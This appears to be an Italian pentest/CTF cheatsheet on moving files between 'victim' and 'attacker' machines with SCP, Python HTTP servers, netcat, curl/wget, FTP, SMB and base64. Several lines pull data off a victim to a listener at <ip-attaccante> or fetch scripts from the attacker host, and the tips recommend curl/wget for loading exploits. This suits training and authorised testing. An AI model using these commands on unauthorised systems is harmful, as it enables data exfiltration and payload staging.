# 📤 File Transfer Cheatsheet

Appunti e snippet per la fase di **trasferimento file** in CTF/Pentest.

## 📌 Obiettivi

* Spostare file da/verso macchina vittima e attaccante
* Usare protocolli sicuri (SSH/SCP) quando disponibili
* Sapere come muoversi anche in shell limitate (senza SSH)

---

## 🔑 SCP (via SSH)

**Perché usarlo:**
È il metodo più sicuro e immediato. Richiede credenziali o chiavi SSH valide.
Si usa come “copia remota” tra due host.

---

### 🔹 Scaricare **da remoto → locale**

👉 Parti dalla tua macchina **attaccante**:

```bash
scp utente@<ip-vittima>:/percorso/remoto/file.jpg /percorso/locale/
```

* `utente` → l’account SSH valido sulla vittima
* `<ip-vittima>` → IP della macchina target
* `/percorso/remoto/file.jpg` → percorso completo sul target
* `/percorso/locale/` → cartella di destinazione sulla tua macchina

---

### 🔹 Inviare **da locale → remoto**

```bash
scp /percorso/locale/file.jpg utente@<ip-vittima>:/percorso/remoto/
```

---

### 🔹 Trasferire intera directory

```bash
scp -r utente@<ip-vittima>:/var/www/html ./backup_html
```

---

## 🌐 Python HTTP Server

**Perché usarlo:**
Se hai solo una shell remota e **niente SSH**, puoi aprire un webserver dalla vittima e scaricare i file con `wget`/`curl`.

---

### 🔹 Dal lato vittima (esporta cartella)

```bash
cd /path/con/file
python3 -m http.server 8080
```

* Avvia un server HTTP sulla porta 8080
* Rende accessibile tutto ciò che sta nella cartella corrente

---

### 🔹 Dal lato attaccante (scarica file)

```bash
wget http://<ip-vittima>:8080/file.jpg
curl -O http://<ip-vittima>:8080/file.jpg
```

---

## 🔁 Netcat (NC)

**Perché usarlo:**
Metodo universale, funziona senza dipendenze particolari.
Consente di trasferire file raw tra due host.

---

### 🔹 Scaricare file **da vittima → attaccante**

👉 Attaccante in ascolto:

```bash
nc -lvnp 4444 > file.jpg
```

👉 Vittima invia:

```bash
nc <ip-attaccante> 4444 < file.jpg
```

---

### 🔹 Inviare file **da attaccante → vittima**

👉 Attaccante invia:

```bash
nc -lvnp 4444 < file.jpg
```

👉 Vittima riceve:

```bash
nc <ip-attaccante> 4444 > file.jpg
```

---

## 📂 Curl / Wget (reverse)

**Perché usarlo:**
Capovolgi lo scenario:

* L’attaccante serve i file
* La vittima li scarica

---

### 🔹 Attaccante (serve file)

```bash
python3 -m http.server 80
```

### 🔹 Vittima (scarica file)

```bash
wget http://<ip-attaccante>/file.sh
curl -O http://<ip-attaccante>/file.sh
```

---

## 🔓 FTP (quando disponibile)

**Perché usarlo:**
Se c’è FTP attivo, puoi sfruttarlo per trasferire file.

### 🔹 Attaccante come server FTP

```bash
python3 -m pyftpdlib -p 21 -w
```

### 🔹 Vittima come client

```bash
ftp <ip-attaccante>
```

---

## ⚡ SMB (condivisioni Windows/Linux)

**Perché usarlo:**
Utile quando SMB è abilitato. Puoi accedere a cartelle condivise.

### 🔹 Attaccante si connette

```bash
smbclient //<ip-vittima>/share -U utente
```

---

## 🧩 Base64 (ultima risorsa)

**Perché usarlo:**
Quando nessun protocollo funziona e puoi solo copiare/incollare testo nella shell.

### 🔹 Dal lato attaccante

```bash
base64 file.jpg > file.txt
```

### 🔹 Dal lato vittima

Copia dentro un file, poi:

```bash
base64 -d file.txt > file.jpg
```

---

## ✅ Best Practice

* **SCP/SSH** → prima scelta, rapido e sicuro
* **Python HTTP server** → ottimo con shell limitata
* **Netcat** → universale, semplice da ricordare
* **Curl/Wget** → ottimo per caricare exploit/script dal tuo host
* **Base64** → “ultima spiaggia” quando tutto il resto è bloccato

---
